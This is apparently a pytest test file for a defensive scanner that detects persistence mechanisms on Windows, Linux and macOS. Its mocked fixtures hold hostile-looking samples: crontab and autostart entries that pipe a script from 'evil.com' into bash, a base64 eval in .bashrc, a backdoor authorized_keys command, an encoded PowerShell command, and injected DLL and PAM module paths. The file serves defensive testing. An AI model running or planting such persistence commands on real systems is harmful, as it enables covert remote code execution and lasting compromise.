"""Tests for scanners.persistence_scanner — Deep Persistence Hunter."""

from __future__ import annotations

import json
import time
from pathlib import Path
from unittest.mock import MagicMock, patch, mock_open

import pytest

from core.config import AgentConfig, Severity
from scanners.persistence_scanner import PersistenceScanner


@pytest.fixture
def scanner():
    return PersistenceScanner(AgentConfig())


# ===================================================================
#  Properties
# ===================================================================
class TestPersistenceScannerProperties:

    def test_name(self, scanner):
        assert scanner.name == "PersistenceScanner"

    def test_description(self, scanner):
        assert "30+" in scanner.description

    def test_supported_platforms(self, scanner):
        assert "all" in scanner.supported_platforms


# ===================================================================
#  Windows Persistence
# ===================================================================
class TestWindowsPersistence:

    @patch("scanners.persistence_scanner.platform.system", return_value="Windows")
    @patch("scanners.persistence_scanner.subprocess.run")
    def test_registry_run_suspicious(self, mock_run, _mock_sys, scanner):
        """Suspicious path in registry Run should yield HIGH."""
        reg_output = (
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
            "    Updater    REG_SZ    C:\\Users\\Public\\update.exe\n"
        )
        mock_run.return_value = MagicMock(returncode=0, stdout=reg_output, stderr="")
        findings = scanner._check_registry_run()
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        assert high[0].evidence["mechanism"] == "Registry Run"

    @patch("scanners.persistence_scanner.platform.system", return_value="Windows")
    @patch("scanners.persistence_scanner.subprocess.run")
    def test_registry_run_clean(self, mock_run, _mock_sys, scanner):
        """Normal registry Run entry should be INFO."""
        reg_output = (
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
            "    SecurityHealth    REG_SZ    C:\\Windows\\System32\\SecurityHealth.exe\n"
        )
        mock_run.return_value = MagicMock(returncode=0, stdout=reg_output, stderr="")
        findings = scanner._check_registry_run()
        info = [f for f in findings if f.severity == Severity.INFO]
        assert len(info) >= 1

    @patch("scanners.persistence_scanner.platform.system", return_value="Windows")
    @patch("scanners.persistence_scanner.subprocess.run")
    def test_scheduled_tasks_suspicious(self, mock_run, _mock_sys, scanner):
        """Scheduled task in temp path should yield HIGH."""
        csv_header = '"TaskName","Task To Run","Next Run Time"\n'
        csv_row = '"\\EvilTask","C:\\Users\\Public\\evil.exe","N/A"\n'
        mock_run.return_value = MagicMock(
            returncode=0, stdout=csv_header + csv_row, stderr=""
        )
        findings = scanner._check_scheduled_tasks()
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        assert high[0].evidence["mechanism"] == "Scheduled Task"

    @patch("scanners.persistence_scanner.platform.system", return_value="Windows")
    @patch("scanners.persistence_scanner.subprocess.run")
    def test_wmi_subscription_detected(self, mock_run, _mock_sys, scanner):
        """WMI event subscription should yield CRITICAL."""
        wmi_json = json.dumps([{"Name": "EvilFilter", "Query": "SELECT * FROM __InstanceModificationEvent"}])
        mock_run.return_value = MagicMock(returncode=0, stdout=wmi_json, stderr="")
        findings = scanner._check_wmi_subscriptions()
        crit = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(crit) >= 1
        assert crit[0].evidence["mechanism"] == "WMI Subscription"

    @patch("scanners.persistence_scanner.platform.system", return_value="Windows")
    @patch("scanners.persistence_scanner.subprocess.run")
    def test_ifeo_hijack_detected(self, mock_run, _mock_sys, scanner):
        """IFEO Debugger value should yield CRITICAL."""
        reg_output = (
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
            "Image File Execution Options\\notepad.exe\n"
            "    Debugger    REG_SZ    C:\\evil\\debugger.exe\n"
        )
        mock_run.return_value = MagicMock(returncode=0, stdout=reg_output, stderr="")
        findings = scanner._check_ifeo()
        crit = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(crit) >= 1
        assert crit[0].evidence["mechanism"] == "IFEO"

    @patch("scanners.persistence_scanner.platform.system", return_value="Windows")
    @patch("scanners.persistence_scanner.subprocess.run")
    def test_appinit_dlls_detected(self, mock_run, _mock_sys, scanner):
        """Non-empty AppInit_DLLs should yield HIGH."""
        reg_output = (
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\n"
            "    AppInit_DLLs    REG_SZ    C:\\evil\\inject.dll\n"
        )
        mock_run.return_value = MagicMock(returncode=0, stdout=reg_output, stderr="")
        findings = scanner._check_appinit_dlls()
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        assert high[0].evidence["mechanism"] == "AppInit_DLLs"

    @patch("scanners.persistence_scanner.platform.system", return_value="Windows")
    @patch("scanners.persistence_scanner.subprocess.run")
    def test_winlogon_shell_hijacked(self, mock_run, _mock_sys, scanner):
        """Winlogon Shell != explorer.exe should yield CRITICAL."""
        reg_output = (
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n"
            "    Shell    REG_SZ    cmd.exe\n"
        )
        mock_run.return_value = MagicMock(returncode=0, stdout=reg_output, stderr="")
        findings = scanner._check_winlogon()
        crit = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(crit) >= 1
        assert crit[0].evidence["mechanism"] == "Winlogon"

    @patch("scanners.persistence_scanner.platform.system", return_value="Windows")
    @patch("scanners.persistence_scanner.subprocess.run")
    def test_winlogon_normal(self, mock_run, _mock_sys, scanner):
        """Normal Winlogon Shell should produce no finding."""
        reg_output = (
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n"
            "    Shell    REG_SZ    explorer.exe\n"
        )
        mock_run.return_value = MagicMock(returncode=0, stdout=reg_output, stderr="")
        findings = scanner._check_winlogon()
        assert len(findings) == 0

    @patch("scanners.persistence_scanner.platform.system", return_value="Windows")
    @patch("scanners.persistence_scanner.subprocess.run")
    def test_services_suspicious_path(self, mock_run, _mock_sys, scanner):
        """Service running from temp directory should yield HIGH."""
        svc_json = json.dumps([{
            "Name": "EvilSvc",
            "PathName": "C:\\Users\\Public\\Temp\\svc.exe",
            "StartMode": "Auto",
        }])
        mock_run.return_value = MagicMock(returncode=0, stdout=svc_json, stderr="")
        findings = scanner._check_services_suspicious_paths()
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        assert high[0].evidence["mechanism"] == "Service"

    @patch("scanners.persistence_scanner.platform.system", return_value="Windows")
    @patch("scanners.persistence_scanner.subprocess.run")
    def test_boot_execute_modified(self, mock_run, _mock_sys, scanner):
        """Non-default BootExecute should yield CRITICAL."""
        reg_output = (
            "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\n"
            "    BootExecute    REG_MULTI_SZ    autocheck autochk *\\0evil_boot\n"
        )
        mock_run.return_value = MagicMock(returncode=0, stdout=reg_output, stderr="")
        findings = scanner._check_boot_execute()
        crit = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(crit) >= 1
        assert crit[0].evidence["mechanism"] == "Boot Execute"


# ===================================================================
#  Linux Persistence
# ===================================================================
class TestLinuxPersistence:

    @patch("scanners.persistence_scanner.platform.system", return_value="Linux")
    @patch("scanners.persistence_scanner.subprocess.run")
    @patch("scanners.persistence_scanner.Path")
    def test_crontab_suspicious(self, mock_path_cls, mock_run, _mock_sys, scanner):
        """Crontab with curl|bash should yield HIGH."""
        # Disable /etc/crontab and /etc/cron.d so we only test user crontab
        mock_path_inst = MagicMock()
        mock_path_inst.is_file.return_value = False
        mock_path_inst.is_dir.return_value = False
        mock_path_cls.return_value = mock_path_inst

        # User crontab via subprocess
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="* * * * * curl http://evil.com/payload.sh | bash",
            stderr="",
        )
        findings = scanner._check_crontabs()
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        assert high[0].evidence["mechanism"] == "Crontab"

    @patch("scanners.persistence_scanner.platform.system", return_value="Linux")
    @patch("scanners.persistence_scanner.time.time", return_value=1700000000.0)
    @patch("scanners.persistence_scanner.Path")
    def test_systemd_recent_unit(self, mock_path_cls, _mock_time, _mock_sys, scanner):
        """Recently created systemd service should yield HIGH."""
        # Create a mock .service file
        mock_service = MagicMock()
        mock_service.name = "evil.service"
        mock_service.is_file.return_value = True
        mock_service.read_text.return_value = (
            "[Service]\nExecStart=/usr/bin/normal_binary\n"
        )
        mock_stat = MagicMock()
        mock_stat.st_mtime = 1700000000.0 - 3600  # 1 hour ago (< 7 days)
        mock_service.stat.return_value = mock_stat
        mock_service.__str__ = lambda self: "/etc/systemd/system/evil.service"

        # Mock directory listing
        mock_sdir = MagicMock()
        mock_sdir.is_dir.return_value = True
        mock_sdir.iterdir.return_value = [mock_service]

        # Make Path("/etc/systemd/system") return our mock
        user_dir = MagicMock()
        user_dir.is_dir.return_value = False

        def path_side_effect(arg):
            if str(arg) == "/etc/systemd/system":
                return mock_sdir
            return user_dir

        mock_path_cls.side_effect = path_side_effect
        mock_path_cls.home.return_value = Path("/nonexistent_home")

        findings = scanner._check_systemd_services()
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        assert high[0].evidence["mechanism"] == "systemd Service"

    @patch("scanners.persistence_scanner.platform.system", return_value="Linux")
    @patch("scanners.persistence_scanner.Path")
    def test_shell_rc_injection(self, mock_path_cls, _mock_sys, scanner):
        """Shell RC file with eval() should yield HIGH."""
        mock_bashrc = MagicMock()
        mock_bashrc.name = ".bashrc"
        mock_bashrc.is_file.return_value = True
        mock_bashrc.read_text.return_value = 'eval(base64_decode("SGVsbG8="))\n'
        mock_bashrc.__str__ = lambda self: "/home/user/.bashrc"

        mock_home = MagicMock()
        mock_path_cls.home.return_value = mock_home
        mock_home.__truediv__ = lambda self, x: mock_bashrc

        findings = scanner._check_shell_rc_injection()
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        assert high[0].evidence["mechanism"] == "Shell RC"

    @patch("scanners.persistence_scanner.platform.system", return_value="Linux")
    @patch("scanners.persistence_scanner.os.environ", {"LD_PRELOAD": ""})
    @patch("scanners.persistence_scanner.Path")
    def test_ld_preload_set(self, mock_path_cls, _mock_sys, scanner):
        """/etc/ld.so.preload with content should yield CRITICAL."""
        mock_preload = MagicMock()
        mock_preload.is_file.return_value = True
        mock_preload.read_text.return_value = "/lib/evil.so\n"
        mock_path_cls.return_value = mock_preload

        findings = scanner._check_ld_preload()
        crit = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(crit) >= 1
        assert crit[0].evidence["mechanism"] == "LD_PRELOAD"

    @patch("scanners.persistence_scanner.platform.system", return_value="Linux")
    @patch("scanners.persistence_scanner.subprocess.run")
    @patch("scanners.persistence_scanner.Path")
    def test_kernel_modules_suspicious(self, mock_path_cls, mock_run, _mock_sys, scanner):
        """lsmod with suspicious module path should be flagged."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="Module                  Size  Used by\n/tmp/rootkit           16384  0\n",
            stderr="",
        )
        # Mock /etc/modules-load.d as non-existent
        mock_dir = MagicMock()
        mock_dir.is_dir.return_value = False
        mock_path_cls.return_value = mock_dir

        findings = scanner._check_kernel_modules()
        assert len(findings) >= 1
        assert findings[0].evidence["mechanism"] == "Kernel Module"

    @patch("scanners.persistence_scanner.platform.system", return_value="Linux")
    @patch("scanners.persistence_scanner.Path")
    def test_ssh_authorized_keys_command(self, mock_path_cls, _mock_sys, scanner):
        """authorized_keys with command= should yield HIGH."""
        mock_auth = MagicMock()
        mock_auth.is_file.return_value = True
        mock_auth.read_text.return_value = (
            'command="/usr/bin/backdoor" ssh-rsa AAAA... user@host\n'
        )
        mock_stat = MagicMock()
        mock_stat.st_mtime = time.time() - 86400 * 30  # old file
        mock_auth.stat.return_value = mock_stat

        mock_home = MagicMock()
        mock_ssh = MagicMock()
        mock_home.__truediv__ = lambda self, x: mock_ssh
        mock_ssh.__truediv__ = lambda self, x: mock_auth
        mock_path_cls.home.return_value = mock_home

        findings = scanner._check_ssh_authorized_keys()
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        assert high[0].evidence["mechanism"] == "SSH Authorized Keys"

    @patch("scanners.persistence_scanner.platform.system", return_value="Linux")
    @patch("scanners.persistence_scanner.Path")
    def test_pam_suspicious_module(self, mock_path_cls, _mock_sys, scanner):
        """PAM config with non-standard module path should be flagged."""
        mock_pam_file = MagicMock()
        mock_pam_file.name = "sshd"
        mock_pam_file.is_file.return_value = True
        mock_pam_file.read_text.return_value = (
            "auth required /opt/evil/pam_backdoor.so\n"
        )
        mock_pam_file.__str__ = lambda self: "/etc/pam.d/sshd"

        mock_pam_dir = MagicMock()
        mock_pam_dir.is_dir.return_value = True
        mock_pam_dir.iterdir.return_value = [mock_pam_file]
        mock_path_cls.return_value = mock_pam_dir

        findings = scanner._check_pam_modules()
        assert len(findings) >= 1
        assert findings[0].evidence["mechanism"] == "PAM Module"

    @patch("scanners.persistence_scanner.platform.system", return_value="Linux")
    @patch("scanners.persistence_scanner.Path")
    def test_xdg_autostart_suspicious(self, mock_path_cls, _mock_sys, scanner):
        """XDG .desktop file with suspicious Exec should be flagged."""
        mock_desktop = MagicMock()
        mock_desktop.name = "evil.desktop"
        mock_desktop.is_file.return_value = True
        mock_desktop.read_text.return_value = (
            "[Desktop Entry]\n"
            "Type=Application\n"
            "Exec=curl http://evil.com/payload | bash\n"
        )
        mock_desktop.__str__ = lambda self: "/home/user/.config/autostart/evil.desktop"

        mock_autostart = MagicMock()
        mock_autostart.is_dir.return_value = True
        mock_autostart.iterdir.return_value = [mock_desktop]

        mock_home = MagicMock()
        mock_config = MagicMock()
        mock_home.__truediv__ = lambda self, x: mock_config
        mock_config.__truediv__ = lambda self, x: mock_autostart
        mock_path_cls.home.return_value = mock_home

        findings = scanner._check_xdg_autostart()
        assert len(findings) >= 1
        assert findings[0].evidence["mechanism"] == "XDG Autostart"


# ===================================================================
#  macOS Persistence
# ===================================================================
class TestMacOSPersistence:

    @patch("scanners.persistence_scanner.platform.system", return_value="Darwin")
    @patch("scanners.persistence_scanner.Path")
    def test_launch_agent_suspicious(self, mock_path_cls, _mock_sys, scanner):
        """LaunchAgent with suspicious program should yield HIGH."""
        mock_plist = MagicMock()
        mock_plist.name = "com.evil.agent.plist"
        mock_plist.is_file.return_value = True
        mock_plist.read_text.return_value = (
            '<?xml version="1.0"?>\n'
            "<plist><dict>\n"
            "<key>ProgramArguments</key>\n"
            "<array><string>/tmp/evil</string></array>\n"
            "</dict></plist>\n"
        )
        mock_plist.__str__ = lambda self: "/Library/LaunchAgents/com.evil.agent.plist"

        mock_agent_dir = MagicMock()
        mock_agent_dir.is_dir.return_value = True
        mock_agent_dir.iterdir.return_value = [mock_plist]

        # Home agent dir is empty
        mock_home_dir = MagicMock()
        mock_home_dir.is_dir.return_value = False

        # Path.home() / "Library" / "LaunchAgents" needs a 2-level __truediv__ chain
        mock_library = MagicMock()
        mock_library.__truediv__ = lambda self, x: mock_home_dir

        mock_home = MagicMock()
        mock_home.__truediv__ = lambda self, x: mock_library

        mock_path_cls.home.return_value = mock_home
        mock_path_cls.side_effect = lambda p: mock_agent_dir

        findings = scanner._check_launch_agents()
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        assert high[0].evidence["mechanism"] == "LaunchAgent"

    @patch("scanners.persistence_scanner.platform.system", return_value="Darwin")
    @patch("scanners.persistence_scanner.Path")
    def test_launch_daemon_non_apple(self, mock_path_cls, _mock_sys, scanner):
        """Non-Apple LaunchDaemon should yield CRITICAL."""
        mock_plist = MagicMock()
        mock_plist.name = "com.evil.daemon.plist"
        mock_plist.is_file.return_value = True
        mock_plist.read_text.return_value = (
            '<?xml version="1.0"?>\n'
            "<plist><dict>\n"
            "<key>Program</key>\n"
            "<string>/usr/local/bin/evil</string>\n"
            "</dict></plist>\n"
        )
        mock_plist.__str__ = lambda self: "/Library/LaunchDaemons/com.evil.daemon.plist"

        mock_daemon_dir = MagicMock()
        mock_daemon_dir.is_dir.return_value = True
        mock_daemon_dir.iterdir.return_value = [mock_plist]
        mock_path_cls.return_value = mock_daemon_dir

        findings = scanner._check_launch_daemons()
        crit = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(crit) >= 1
        assert crit[0].evidence["mechanism"] == "LaunchDaemon"

    @patch("scanners.persistence_scanner.platform.system", return_value="Darwin")
    @patch("scanners.persistence_scanner.subprocess.run")
    def test_login_item_detected(self, mock_run, _mock_sys, scanner):
        """Login items from osascript should yield findings."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="Spotify, iTerm",
            stderr="",
        )
        findings = scanner._check_login_items()
        assert len(findings) >= 2
        assert findings[0].evidence["mechanism"] == "Login Item"

    @patch("scanners.persistence_scanner.platform.system", return_value="Darwin")
    @patch("scanners.persistence_scanner.Path")
    def test_kext_non_apple(self, mock_path_cls, _mock_sys, scanner):
        """Non-Apple kext should yield CRITICAL."""
        mock_kext = MagicMock()
        mock_kext.name = "SuspiciousDriver.kext"

        mock_ext_dir = MagicMock()
        mock_ext_dir.is_dir.return_value = True
        mock_ext_dir.iterdir.return_value = [mock_kext]
        mock_path_cls.return_value = mock_ext_dir

        findings = scanner._check_kext()
        crit = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(crit) >= 1
        assert crit[0].evidence["mechanism"] == "Kernel Extension"


# ===================================================================
#  Helpers
# ===================================================================
class TestHelpers:

    @patch("scanners.persistence_scanner.platform.system", return_value="Windows")
    def test_is_suspicious_path_temp(self, _mock_sys, scanner):
        assert scanner._is_suspicious_path("C:\\Users\\Public\\malware.exe") is True

    @patch("scanners.persistence_scanner.platform.system", return_value="Windows")
    def test_is_suspicious_path_normal(self, _mock_sys, scanner):
        assert scanner._is_suspicious_path("C:\\Program Files\\App\\app.exe") is False

    def test_has_suspicious_command_encoded(self, scanner):
        matches = scanner._has_suspicious_command("powershell -EncodedCommand SGVsbG8=")
        assert len(matches) >= 1

    def test_has_suspicious_command_clean(self, scanner):
        matches = scanner._has_suspicious_command("notepad.exe document.txt")
        assert len(matches) == 0
